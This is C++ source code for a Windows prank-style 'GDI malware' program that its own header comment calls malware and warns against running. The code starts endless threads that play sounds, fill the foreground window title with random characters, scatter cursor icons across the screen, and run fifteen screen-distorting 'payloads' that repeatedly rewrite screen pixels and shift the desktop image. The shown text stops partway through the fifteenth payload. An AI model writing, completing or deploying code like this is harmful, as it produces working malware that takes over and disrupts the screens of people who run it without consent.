// PsychotryAgain.cpp : Defines the entry point for the application.
//

#include "PsychotryAgain.h"

#include "main.h"
#include "sound.h"

//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\

/*

  ===MESSAGE===

If you're reading this message, then you got the src(source code) from the author or you decompiled the malware, right?
So I'm going to tell you something
Don't ever apply this malware!!!
Because this malware is based on hydrogen.
There is no good in applying it!

That's all.

*/

//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\

//Default GDI

DWORD WINAPI sound(LPVOID lpParam)
{
	while (1)
	{
		sound1();
		Sleep(30000);
		sound2();
		Sleep(30000);
		sound3();
		Sleep(30000);
		sound4();
		Sleep(30000);
		sound5();
		Sleep(30000);
		sound6();
		Sleep(30000);
		sound7();
		Sleep(30000);
	}
}

DWORD WINAPI garbled(LPVOID lpParam)
{
	int uVar1;
	HWND hWnd;
	int iVar2;
	uint uVar3;
	CHAR* lpString;
	CHAR local_9;
	do
	{
		iVar2 = 0;
		do
		{
			uVar1 = rdtsc();
			uVar3 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
			uVar3 = uVar3 ^ uVar3 << 0x11;
			(&local_9)[iVar2] = (CHAR)((ulonglong)(uVar3 << 5 ^ uVar3) % 0x47);
			iVar2 = iVar2 + 1;
		} while (iVar2 < 0x46);
		lpString = &local_9;
		hWnd = GetForegroundWindow();
		SetWindowTextA(hWnd, lpString);
		Sleep(2500);
	} while (true);
}

DWORD WINAPI cursor(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	CURSORINFO curinf;
	int x = GetSystemMetrics(0), y = GetSystemMetrics(1);
	while (1)
	{
		GetCursorInfo(&curinf);
		curinf.cbSize = sizeof(curinf);
		DrawIcon(desk, rand() % x, rand() % y, curinf.hCursor);
		Sleep(100);
	}
}

//GDI Designation

//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\

//payload1

DWORD WINAPI gdi1(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			int randPixel = rand() % 150;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cy + j].r + j / 10) % 150, (prgbScreen[i * szScreen.cx + j].b ^ i / 1) % 404, int(sqrt(prgbScreen[i * szScreen.cy + j].b + t)) % 3500);
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(5);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload2

DWORD WINAPI gdi2(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].r * i) % 900, (prgbScreen[i].r | j / 2) % 450, (prgbScreen[25].r + j / 2) % 666);
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(25);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload3

DWORD WINAPI gdi3(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].r & i) % 750, (prgbScreen[i].r + j / 4) % 404, (prgbScreen[25].r + j / 2) % 666);
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(25);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload4

DWORD WINAPI gdi4(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].r - i), (prgbScreen[i * szScreen.cx + j].r & j), (prgbScreen[i * szScreen.cx + j].b));
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(5);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload5

DWORD WINAPI gdi5(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;
		HDC desk = GetDC(0);
		int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		double moveangle = 0;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].g ^ j) % 150, (prgbScreen[i * szScreen.cx + j].r | i), (prgbScreen[5].r + j / 7) % 403);
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(25);
			int ax = (int)(cos(moveangle) * 5), ay = (int)(tan(moveangle) * 5);
			BitBlt(desk, ax, ay, sw, sh, desk, 0, 0, SRCCOPY);
			moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload6

DWORD WINAPI gdi6(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].r - i) % 1000, (prgbScreen[i].r ^ j / 4) % 290, (prgbScreen[5].r + j / 3) % 500);
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(5);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload7

DWORD WINAPI gdi7(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].r & j) % 1000, (prgbScreen[i].r * i / 3), (prgbScreen[3].r + j / 5));
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(5);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload8

DWORD WINAPI gdi8(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].r & j), (prgbScreen[i].r ^ i / 4), (prgbScreen[3].r + j / 2));
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(5);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload9

DWORD WINAPI gdi9(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].g & j), (prgbScreen[i].r ^ i), (prgbScreen[i * szScreen.cx + j].b + i / 60));
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(5);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload10

DWORD WINAPI gdi10(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;
		HDC desk = GetDC(0);
		int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		double moveangle = 0;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].g & j), (prgbScreen[i].r ^ i), (prgbScreen[i * szScreen.cx + j].r + i / 75));
				}
			}
			int ax = (int)(cos(moveangle) * 25), ay = (int)(tan(moveangle) * 0);
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			BitBlt(desk, ax, ay, sw, sh, desk, 0, 0, SRCCOPY);
			moveangle = fmod(moveangle + M_PI / 16.f, M_PI * 2.f);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(5);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload11

DWORD WINAPI gdi11(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].g + j), (prgbScreen[i].r ^ i), (prgbScreen[i * szScreen.cx + j].b = i)) + 8 + t;
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(5);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload12

DWORD WINAPI gdi12(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].g | j), (prgbScreen[i].r & i), (prgbScreen[i].rgb % 0x404) * 0x404404);
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(50);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload13

DWORD WINAPI gdi13(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].g | j), (prgbScreen[i].r ^ i), (prgbScreen[i].b > i / 57)) * t;
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(5);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload14

DWORD WINAPI gdi14(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].g & i) % 40, (prgbScreen[i].r | j) % 30, (prgbScreen[i].b > i / 50)) * t;
				}
			}
			BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
			ReleaseDC(NULL, hdcScreen);
			DeleteObject(hdcScreen);
			Sleep(5);
		}
		DeleteObject(hbmScreen);
		DeleteDC(hdcTempScreen);
		RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
		Sleep(1000);
	}
}

//payload15

DWORD WINAPI gdi15(LPVOID lpParam)
{
	while (1)
	{
		int Time = 10;
		int dwStartTime = Time;
		HDC hdcScreen = GetDC(NULL);
		POINT ptScreen = GetVirtualScreenPos();
		SIZE szScreen = GetVirtualScreenSize();

		BITMAPINFO bmi = { 0 };
		PRGBQUAD prgbScreen;
		HDC hdcTempScreen;
		HBITMAP hbmScreen;

		bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
		bmi.bmiHeader.biBitCount = 32;
		bmi.bmiHeader.biPlanes = 1;
		bmi.bmiHeader.biWidth = szScreen.cx;
		bmi.bmiHeader.biHeight = szScreen.cy;

		hdcTempScreen = CreateCompatibleDC(hdcScreen);
		hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
		SelectObject(hdcTempScreen, hbmScreen);

		for (int i = 0; Time < (dwStartTime + Time); i++)
		{
			hdcScreen = GetDC(NULL);
			BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
			int t = i;
			int randPixel = 5;
			for (int i = 0; i < szScreen.cy; i++)
			{
				for (int j = 0; j < szScreen.cx; j++)
				{
					prgbScreen[i * szScreen.cx + j].rgb = RGB((prgbScreen[i * szScreen.cx + j].g & j) / 8, (prgbScreen[i].r | i), (prgbScreen[i].b > i / 55)) + t;
				}
			}
